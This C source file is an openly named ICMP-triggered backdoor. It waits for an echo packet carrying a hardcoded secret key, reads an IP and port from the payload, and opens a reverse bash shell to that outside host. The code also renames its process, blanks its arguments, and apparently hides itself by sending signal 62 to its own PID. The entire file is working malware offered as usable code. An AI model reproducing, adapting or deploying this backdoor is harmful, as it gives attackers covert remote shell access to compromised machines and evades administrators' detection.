#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <stdarg.h>
#include <errno.h>
#include <ctype.h>

#define BUFF_SIZE        1024
#define SECRET_KEY       "wA@2mC!dq"
#define BASH_PATH        "/bin/bash\n"
#define SYSTEM_SHELL     "/bin/bash"
#define SERVICE_NAME     "backdoor"

void hide_process(){
    char cmd[50];
    pid_t pid = getpid();
    sprintf(cmd, "kill -62 %i", (int) pid);
    system(cmd);
}

void initiate_reverse_shell(char *server_ip, unsigned short server_port){
    int network_socket;
    char port_str[15];
    struct addrinfo *info, hints_config, *info_ptr;
    
    sprintf(port_str, "%d", server_port);

    memset(&hints_config, 0, sizeof(struct addrinfo));
    hints_config.ai_family = AF_INET;

    if(getaddrinfo(server_ip, port_str, &hints_config, &info) != 0){
        return;
    }

    for (info_ptr = info; info_ptr != NULL; info_ptr = info_ptr->ai_next){
        network_socket = socket(info_ptr->ai_family, info_ptr->ai_socktype, info_ptr->ai_protocol);
        if(network_socket < 0)	continue;

        if(connect(network_socket, info->ai_addr, info->ai_addrlen) == 0){
            /* Connection successful */
            break;
        }
        close(network_socket);
    }
    if(info_ptr == NULL){
        return;
    }
    freeaddrinfo(info);

	  // Sending header information
    write(network_socket, BASH_PATH, strlen(BASH_PATH));
    
    // Redirecting stdio to socket
    dup2(network_socket, 0); 
    dup2(network_socket, 1); 
    dup2(network_socket, 2);
    execl(SYSTEM_SHELL, SYSTEM_SHELL, (char *)0);
    close(network_socket);
}

void icmp_packet_listener(void){
    int socket_fd;
    int received_bytes;	
    int key_length;
    char buffer[BUFF_SIZE + 1];
    struct ip *ip_hdr;
    struct icmp *icmp_hdr;

	  key_length = strlen(SECRET_KEY);
    socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    // Waiting for ICMP packets
	  while(1){
        memset(buffer, 0, BUFF_SIZE + 1);        
        received_bytes = recv(socket_fd, buffer, BUFF_SIZE, 0);
        if(received_bytes > 0){    
            ip_hdr = (struct ip *)buffer;
            icmp_hdr = (struct icmp *)(ip_hdr + 1);
                
            // Checking for ICMP_ECHO packet and matching KEY
            if((icmp_hdr->icmp_type == ICMP_ECHO) && (memcmp(icmp_hdr->icmp_data, SECRET_KEY, 
              key_length) == 0)){
                char client_ip[16];
                int client_port;
                client_port = 0;
                memset(client_ip, 0, sizeof(client_ip));
                sscanf((char *)(icmp_hdr->icmp_data + key_length + 1), "%15s %d", 
                  client_ip, &client_port);
                    
                if((client_port <= 0) || (strlen(client_ip) < 7))
                    continue;
                // Launching reverse shell
                if(fork() == 0){
                    initiate_reverse_shell(client_ip, client_port);
                    exit(EXIT_SUCCESS);
                }
            }
        }
    }
}

int main(int argc, char *argv[]){ 
	  // Handling zombie processes
    signal(SIGCHLD, SIG_IGN); 
    chdir("/");
    // Print information if -v flag is passed
    if ((argc == 2) && (argv[1][0] == '-') && (argv[1][1] == 'v')){
        fprintf(stdout, "Secret Key:\t\t%s\n",SECRET_KEY);
		    fprintf(stdout, "Service Name:\t\t%s\n", SERVICE_NAME);
        fprintf(stdout, "Shell Path:\t\t%s\n", SYSTEM_SHELL);
    }

    // Renaming process
    strncpy(argv[0], SERVICE_NAME, strlen(argv[0]));
    for (int i = 1; i < argc; i++){
       memset(argv[i], ' ', strlen(argv[i]));
	  }

    if (fork() != 0)
        exit(EXIT_SUCCESS);
    
    if (getgid() != 0) {
        exit(EXIT_FAILURE);
    }
    hide_process();

	  icmp_packet_listener();
    return EXIT_SUCCESS;
}
